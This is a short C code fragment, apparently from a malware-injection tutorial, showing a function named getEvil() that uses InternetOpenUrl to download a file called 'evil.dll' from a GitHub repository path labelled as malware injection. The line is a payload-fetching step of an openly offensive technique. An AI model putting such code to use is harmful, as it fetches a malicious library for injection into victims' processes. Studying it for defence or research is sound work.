...
char* getEvil() {
  ...
  HINTERNET hHttpFile = InternetOpenUrl(hSession, (LPCSTR)"https://github.com/cocomelonc/meow/raw/refs/heads/master/2022-04-13-malware-injection-19/evil.dll", 0, 0, 0, 0);
